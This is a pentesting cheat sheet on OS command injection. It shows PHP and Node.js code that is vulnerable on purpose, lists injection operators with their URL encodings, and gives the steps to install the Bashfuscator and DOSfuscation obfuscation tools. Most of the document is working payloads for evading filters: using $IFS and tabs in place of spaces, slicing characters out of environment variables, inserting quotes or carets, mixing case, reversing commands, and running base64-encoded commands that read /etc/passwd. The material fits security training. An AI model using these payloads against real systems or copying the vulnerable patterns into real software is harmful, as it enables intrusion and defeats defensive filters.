# \</> Command Injections

To check if Powershell or CMD:

```powershell
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```

Example of vulnerable code for command injection:

```php
<?php
if (isset($_GET['filename'])) {
    system("touch /tmp/" . $_GET['filename'] . ".pdf");
}
?>
```

```javascript
app.get("/createfile", function(req, res){
    child_process.exec(`touch /tmp/${req.query.filename}.txt`);
})
```

## Automated

### Linux (Bashfuscator)

```bash
git clone https://github.com/Bashfuscator/Bashfuscator
cd Bashfuscator
pip3 install setuptools==65
python3 setup.py install --user
```

To use:

```
cd ./bashfuscator/bin/
./bashfuscator -h
./bashfuscator -c 'cat /etc/passwd'
```

But to fine-tune:

```
./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
```

### Windows (DOSfuscation)

```powershell
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
cd Invoke-DOSfuscation
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation
```

To use

```
Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt

Invoke-DOSfuscation> encoding
Invoke-DOSfuscation\Encoding> 1
```

## Detection

#### Command Injection Methods

| Injection Operator | Injection Character | URL-Encoded Character | Executed Command                           |
| ------------------ | ------------------- | --------------------- | ------------------------------------------ |
| Semicolon          | ;                   | %3b                   | Both                                       |
| New Line           |                     | %0a                   | Both                                       |
| Background         | &                   | %26                   | Both (second output generally shown first) |
| Pipe               | \|                  | %7c                   | Both (only second output is shown)         |
| AND                | &&                  | %26%26                | Both (only if first succeeds)              |
| OR                 | \|\|                | %7c%7c                | Second (only if first fails)               |
| Sub-Shell          | \`\`                | %60%60                | Both (Linux-only)                          |
| Sub-Shell          | $()                 | %24%28%29             | Both (Linux-only)                          |

**Note**: The only exception may be the semi-colon `;`, which will not work if the command was being executed with Windows Command Line (CMD), but would still work if it was being executed with Windows PowerShell.

## Identifying filters

Invalid input from server side

<figure><img src="../../.gitbook/assets/Command Injections.png" alt=""><figcaption></figcaption></figure>

&#x20;If the error message displayed a different page, with information like our IP and our request, this may indicate that it was denied by a WAF. A php code for blacklisting characters may look like this:

```php
$blacklist = ['&', '|', ';', ...SNIP...];
foreach ($blacklist as $character) {
    if (strpos($_POST['ip'], $character) !== false) {
        echo "Invalid input";
    }
}
```

Try all characters check if everything is blacklisted

#### Bypass Blacklisted Operators

If **space** is blacklisted:

* Use %09 (Tab)
* Use $IFS
* Brace expension i.e `{ls,-la}`

**Linux**

**To list all environment variables use `printenv`**

Example: `127.0.0.1${LS_COLORS:10:1}${IFS}`

If `/` or `\` is blacklisted:

* We can use environment variables:
  * `echo ${PATH}` to check path
  * `echo ${PATH:0:1}` to select `/`
  * NOTE: DONT USE ECHO IN COMMAND If `;` blacklisted:
* Try something like `echo ${LS_COLORS:10:1}`

**Windows**

If we need `\` **CMD**

* Use `echo %HOMEPATH:~6,-11%` (modify the start and end)

**Powershell**

* `$env:HOMEPATH[0]`
* `$env:PROGRAMFILES[10]` We can also use **Get-ChildItem Env**: PowerShell command to print all environment variables and then pick one of them to produce a character we need

**Character Shifting**

Find ascii of the previous character of what is actually needed then

```
man ascii     # \ is on 92, before it is [ on 91
echo $(tr '!-}' '"-~'<<<[)
```

#### Bypass Blacklisted Commands

Example:

```php
$blacklist = ['whoami', 'cat', ...SNIP...];
foreach ($blacklist as $word) {
    if (strpos('$_POST['ip']', $word) !== false) {
        echo "Invalid input";
    }
}
```

**Linux & Windows**

Add characters that are ignored by the shell like `'` or `"` Example: `w'h'o'am'i`

**Linux only**

Can add `\` or `$@` Example: `who$@ami` `w\ho\am\i`

**WIndows Only**

We can user `^` Example: `who^ami`

## Advanced Command Obfuscation

Like WAFs and these techniques won't work

### Case manipulation

In **windows** CMD And Powershell commands are case-insensitive Example: `WhOaMi`

In linux we can find a command that turns uppercaase to lowercase:&#x20;

`$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")`

<figure><img src="../../.gitbook/assets/Command Injections-1.png" alt=""><figcaption></figcaption></figure>

### Burp POST Request

The above command failed due to usage of spaces&#x20;

<figure><img src="../../.gitbook/assets/Command Injections-2.png" alt=""><figcaption></figcaption></figure>

We can use `$(a="WhOaMi";printf %s "${a,,}")`

### Reversed commands

#### Linux

To get reversed command: `echo 'whoami' | rev` To execute: `$(rev<<<'imaohw')`

**Tip**: If you wanted to bypass a character filter with the above method, you'd have to reverse them as well, or include them when reversing the original command.

#### Windows

**Powershell**

To reverse: `"whoami"[-1..-20] -join ''`&#x20;

To execute:

```
iex "$('imaohw'[-1..-20] -join '')"
```

### Encoded Commands

#### Linux

To encode:&#x20;

```
echo -n 'cat /etc/passwd | grep 33' | base64 To execute: bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```

Tip: Note that we are using <<< to avoid using a pipe |, which is a filtered character.

#### Windows

To base64 encode:&#x20;

```
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
```

To execute:&#x20;

```
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))
```
